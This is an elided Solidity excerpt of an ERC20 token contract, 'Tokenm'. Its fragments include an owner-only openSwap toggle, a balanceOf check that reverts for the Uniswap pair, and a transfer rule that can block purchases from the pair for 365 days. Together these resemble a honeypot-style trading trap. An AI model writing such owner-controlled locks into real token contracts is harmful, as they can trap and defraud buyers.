...
contract Tokenm is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("tokenm", "tokenm") {
        require(_baseToken < address(this),"tokenm small");
    ...
    function balanceOf(address user) public override view returns(uint256){
        if(user == uniswapV2Pair){require(super.balanceOf(uniswapV2Pair) > 0);}
	...
	function openSwap() public  {
        require(msg.sender == _contractSender,"o");
        if(startTime > 0){
            startTime = 0;
        }else{
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {} else {
			...
			if(_isPairs[from]){
				...
				require(startTime.add(365 * 86400) < block.timestamp,"startTime");
                super._transfer(from, _destroyAddress, amount.div(100).mul(2));
                amount = amount.div(100).mul(98);
			}
        }
